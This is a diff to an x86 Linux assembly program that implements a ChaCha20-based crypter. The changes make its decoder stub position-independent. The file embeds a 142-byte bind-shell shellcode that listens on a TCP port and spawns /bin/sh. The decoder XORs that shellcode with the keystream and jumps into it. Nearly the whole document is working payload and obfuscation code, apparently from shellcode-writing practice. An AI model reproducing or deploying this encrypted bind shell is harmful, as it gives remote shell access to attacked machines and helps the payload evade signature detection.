@@ -1,11 +1,52 @@
 ; Author: @bugsam
-; Date: 08/18/2020
+; Date: 08/19/2020
 global _start
 
 ; check RFC7539
 ; I'd rather choose to start block counter as 0x02 (runtime)
+section .text
+_start:
+	jmp short payload
 
-section .data
+; computation of a 64-byte block of the stream of Chacha
+; input: key, nonce, block counter stored in matrix M
+; output: a 64-byte block of the stream
+block:	
+	pop esi			; ESI: matrixm
+	push esi	
+	mov ebx, [esi+0x30]	; EBX: matrixm[12]
+	inc ebx			; increments block counter
+	mov [esi+0x30], ebx	; ESI+0x30: saves block counter
+
+				; esi: matrixm
+				; esi+0x40: matrixv
+				; esi+0x80: shellcode
+	
+	push ecx		; stream counter
+	push 0x10		; matrix size: 0x10 dword
+	pop ecx			; ECX: matrix_size
+		 		; ESI: matrixm
+	lea edi, [esi+0x40]	; EDI: matrixv
+	cld			; increment index of ESI|EDI
+	rep movsd		
+	xchg edi, esi		
+	sub esi, 0x80		
+
+	call round		; mix matrixv
+	call addmatrix		; matrixm + matrixv
+	
+	pop ecx
+	dec ecx
+	jnz block
+
+	add edi, 0x50		; matrixv+0x10: shellcode
+	call xorstream		; matrixv xor shellcode_encoded
+	
+	jmp shellcode
+
+payload:
+	mov ecx, 0x03
+	call block	
 	matrixm: db 0x61, 0x70, 0x78, 0x65, \
 		0x33, 0x20, 0x64, 0x6e, \
 		0x79, 0x62, 0x2d, 0x32, \
@@ -32,13 +73,14 @@ section .data
 		; c0 = 61707865, c1 = 3320646E, c2 = 79622D32, and c3 = 6B206574 are predefined constants;
 		; blockcount = 32-bit initial counter (ups to 256GB)
  		; nonce = 96-bit nonce, also known as Initialization Vector
+	
+	matrixv: times 80 nop		; 512-bits + 128-bits extra (shellcode execution)
 
-section .bss
-	matrixv resd 16		; 512-bits
-
-section .text
-_start:
-	jmp payload
+	; bind_tcp (have to XOR)
+	; size 0x8e (142)
+	shellcode: db 0x31,0xff,0x31,0xd2,0x31,0xdb,0x31,0xc0,0x52,0x6a,0x01,0x6a,0x02,0x89,0xe1,0xb3,0x01,0xb0,0x66,0xcd,0x80,0x31,0xd2,0x52,0x66,0xba,0x05,0x39,0xc1,0xe2,0x10,0xb2,0x02,0x52,0x89,0xe1,0x6a,0x10,0x51,0x50,0x89,0xe1,0xb3,0x02,0xb0,0x66,0xcd,0x80,0x5a,0x57,0x52,0x89,0xe1,0xb3,0x04,0xb0,0x66,0xcd,0x80,0x57,0x57,0x89,0xe1,0x57,0x57,0x52,0x89,0xe1,0xb3,0x05,0xb0,0x66,0xcd,0x80,0x31,0xc9,0xb1,0x02,0x89,0xc3,0x51,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0x59,0x49,0x7d,0xf5,0xeb,0x1c,0x5e,0x31,0xdb,0x8d,0x4e,0x0d,0x89,0x0e,0x89,0x5e,0x04,0x88,0x5e,0x0f,0x8d,0x56,0x04,0x8d,0x0e,0x8d,0x5e,0x08,0x31,0xc0,0xb0,0x0b,0xcd,0x80,0xe8,0xdf,0xff,0xff,0xff,0x5a,0x5a,0x5a,0x5a,0x4e,0x4e,0x4e,0x4e,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x4e
+; insert exit 0
+; TODO
 
 ; the chacha quarter round function
 ; input: four 32-bit integer a, b, c and d
@@ -71,107 +113,108 @@ round:
 	push ebp
 	mov ebp, esp
 	
-	mov ecx, 0x9		; 20 rounds (Nr/2-1)
+	push 0x09
+	pop ecx			; 20 rounds (Nr/2-1)
 				; Nr (Rounds number)
 round_l:
 	push ecx
 	; odd number
 	; first line
-	mov eax, [matrixv]
-	mov ebx, [matrixv+16]
-	mov ecx, [matrixv+32]
-	mov edx, [matrixv+48]
+	mov eax, [edi]
+	mov ebx, [edi+16]
+	mov ecx, [edi+32]
+	mov edx, [edi+48]
 	call qr			; QR(v0,v4,v8,v12)
 	
-	mov [matrixv], eax
-	mov [matrixv+16], ebx
-	mov [matrixv+32], ecx
-	mov [matrixv+48], edx
+	mov [edi], eax
+	mov [edi+16], ebx
+	mov [edi+32], ecx
+	mov [edi+48], edx
 	
 	; second line
-	mov eax, [matrixv+4]
-	mov ebx, [matrixv+20]	
-	mov ecx, [matrixv+36]
-	mov edx, [matrixv+52]
+	mov eax, [edi+4]
+	mov ebx, [edi+20]	
+	mov ecx, [edi+36]
+	mov edx, [edi+52]
 	call qr			; QR(v1,v5,v9,v13)
 	
-	mov [matrixv+4], eax
-	mov [matrixv+20], ebx
-	mov [matrixv+36], ecx
-	mov [matrixv+52], edx
+	mov [edi+4], eax
+	mov [edi+20], ebx
+	mov [edi+36], ecx
+	mov [edi+52], edx
 	
 	; third line
-	mov eax, [matrixv+8]
-	mov ebx, [matrixv+24]	
-	mov ecx, [matrixv+40]
-	mov edx, [matrixv+56]
+	mov eax, [edi+8]
+	mov ebx, [edi+24]	
+	mov ecx, [edi+40]
+	mov edx, [edi+56]
 	call qr			; QR(v2,v6,v10,v14)
 	
-	mov [matrixv+8], eax
-	mov [matrixv+24], ebx
-	mov [matrixv+40], ecx
-	mov [matrixv+56], edx
+	mov [edi+8], eax
+	mov [edi+24], ebx
+	mov [edi+40], ecx
+	mov [edi+56], edx
 	
 	; fourth line
-	mov eax, [matrixv+12]
-	mov ebx, [matrixv+28]
-	mov ecx, [matrixv+44]
-	mov edx, [matrixv+60]
+	mov eax, [edi+12]
+	mov ebx, [edi+28]
+	mov ecx, [edi+44]
+	mov edx, [edi+60]
 	call qr			; QR(v3,v7,v11,v15)
 	
-	mov [matrixv+12], eax
-	mov [matrixv+28], ebx
-	mov [matrixv+44], ecx
-	mov [matrixv+60], edx
+	mov [edi+12], eax
+	mov [edi+28], ebx
+	mov [edi+44], ecx
+	mov [edi+60], edx
 	
 	; even number
 	; first line
-	mov eax, [matrixv]	
-	mov ebx, [matrixv+20]
-	mov ecx, [matrixv+40]
-	mov edx, [matrixv+60]
+	mov eax, [edi]	
+	mov ebx, [edi+20]
+	mov ecx, [edi+40]
+	mov edx, [edi+60]
 	call qr			; QR(v0,v5,v10,v15)
 	
-	mov [matrixv], eax
-	mov [matrixv+20], ebx
-	mov [matrixv+40], ecx
-	mov [matrixv+60], edx
+	mov [edi], eax
+	mov [edi+20], ebx
+	mov [edi+40], ecx
+	mov [edi+60], edx
 	
 	; second line
-	mov eax, [matrixv+4]
-	mov ebx, [matrixv+24]
-	mov ecx, [matrixv+44]
-	mov edx, [matrixv+48]
+	mov eax, [edi+4]
+	mov ebx, [edi+24]
+	mov ecx, [edi+44]
+	mov edx, [edi+48]
 	call qr			; QR(v1,v6,v11,v12)
 	
-	mov [matrixv+4], eax
-	mov [matrixv+24], ebx
-	mov [matrixv+44], ecx
-	mov [matrixv+48], edx
+	mov [edi+4], eax
+	mov [edi+24], ebx
+	mov [edi+44], ecx
+	mov [edi+48], edx
 	
 	; third line
-	mov eax, [matrixv+8]
-	mov ebx, [matrixv+28]
-	mov ecx, [matrixv+32]
-	mov edx, [matrixv+52]
+	mov eax, [edi+8]
+	mov ebx, [edi+28]
+	mov ecx, [edi+32]
+	mov edx, [edi+52]
 	call qr			; QR(v2,v7,v8,v13)
 	
-	mov [matrixv+8], eax
-	mov [matrixv+28], ebx
-	mov [matrixv+32], ecx
-	mov [matrixv+52], edx
+	mov [edi+8], eax
+	mov [edi+28], ebx
+	mov [edi+32], ecx
+	mov [edi+52], edx
 	
 	; fourth line
-	mov eax, [matrixv+12]
-	mov ebx, [matrixv+16]
-	mov ecx, [matrixv+36]
-	mov edx, [matrixv+56]
+	mov eax, [edi+12]
+	mov ebx, [edi+16]
+	mov ecx, [edi+36]
+	mov edx, [edi+56]
 	call qr			; QR(v3,v4,v9,v14)
 	
-	mov [matrixv+12], eax
-	mov [matrixv+16], ebx
-	mov [matrixv+36], ecx
-	mov [matrixv+56], edx
+	mov [edi+12], eax
+	mov [edi+16], ebx
+	mov [edi+36], ecx
+	mov [edi+56], edx
 	
 	pop ecx
 	dec ecx
@@ -184,13 +227,14 @@ addmatrix:
 	push ebp
 	mov ebp, esp
 	xor ebx, ebx
-	mov ecx, 0x10			; interact with all blocks
+	push 0x10
+	pop ecx				; interact with all blocks
 		
 addmatrix_l:
-	mov eax, [matrixv+ebx]
-	add eax, [matrixm+ebx]
+	mov eax, [edi+ebx]		; EDI: matrixv
+	add eax, [esi+ebx]		; ESI: matrixm
 	bswap eax			; little endian conversion
-	mov [matrixv+ebx], eax
+	mov [edi+ebx], eax		; matrixv+offset
 
 	add ebx, 0x04
 	loop addmatrix_l
@@ -202,54 +246,27 @@ xorstream:
 	push ebp
 	mov ebp, esp
 	xor ebx, ebx
-	mov ecx, 0x8e		; payload size
-	
+	push edi
+	push esi
+	push 0x8e		; bytes
+	pop ecx			; payload size
+
 xorstream_l:
-	mov esi, [matrixm+ebx]
-	lea edi, [esp+0x8]	; ciphertext (payload location)
-	add edi, ebx
-	mov eax, [edi]		; dword location
+	mov esi, [esp]
+	add esi, ebx		; ESI: matrixm
+	mov edi, [esp+0x4]
+	add edi, ebx		; EDI: ciphertext payload
+	mov eax, edi		; dword location
+	push dword[esi]
+	push dword[edi]
+	pop edx
+	pop esi
 
-	xor edi, esi		; xor ciphertext with keystream
-	mov [eax], edi		; restore word location
+	xor edx, esi		; xor ciphertext with keystream
+	mov [eax], dl		; restore word location
 
-	add ebx, 0x4		; 0x04 dword size
+	inc ebx			; next byte
 	loop xorstream_l
 		
 	leave
 	ret
-
-; computation of a 64-byte block of the stream of Chacha
-; input: key, nonce, block counter stored in matrix M
-; output: a 64-byte block of the stream
-block:	
-	mov eax, [matrixm+48]
-	inc eax
-	mov [matrixm+48], eax	; block counter (word 12)
-	
-	pop esi
-	push esi		; shellcode address
-	push ecx		; stream counter
-	
-	mov ecx, 0x10		; (matrix size) dword
-	lea esi, [matrixm]
-	lea edi, [matrixv]
-	cld			; increment index of ESI|EDI
-	rep movsd		
-		
-	call round
-	call addmatrix
-	
-	pop ecx
-	dec ecx
-	jnz block
-
-	call xorstream
-	
-	jmp shellcode
-payload:
-	mov ecx, 0x03
-	call block	
-	; bind_tcp (have to XOR)
-	; size 0x8e (142)
-	shellcode: db 0x31,0xff,0x31,0xd2,0x31,0xdb,0x31,0xc0,0x52,0x6a,0x01,0x6a,0x02,0x89,0xe1,0xb3,0x01,0xb0,0x66,0xcd,0x80,0x31,0xd2,0x52,0x66,0xba,0x05,0x39,0xc1,0xe2,0x10,0xb2,0x02,0x52,0x89,0xe1,0x6a,0x10,0x51,0x50,0x89,0xe1,0xb3,0x02,0xb0,0x66,0xcd,0x80,0x5a,0x57,0x52,0x89,0xe1,0xb3,0x04,0xb0,0x66,0xcd,0x80,0x57,0x57,0x89,0xe1,0x57,0x57,0x52,0x89,0xe1,0xb3,0x05,0xb0,0x66,0xcd,0x80,0x31,0xc9,0xb1,0x02,0x89,0xc3,0x51,0x31,0xc0,0xb0,0x3f,0xcd,0x80,0x59,0x49,0x7d,0xf5,0xeb,0x1c,0x5e,0x31,0xdb,0x8d,0x4e,0x0d,0x89,0x0e,0x89,0x5e,0x04,0x88,0x5e,0x0f,0x8d,0x56,0x04,0x8d,0x0e,0x8d,0x5e,0x08,0x31,0xc0,0xb0,0x0b,0xcd,0x80,0xe8,0xdf,0xff,0xff,0xff,0x5a,0x5a,0x5a,0x5a,0x4e,0x4e,0x4e,0x4e,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x4e
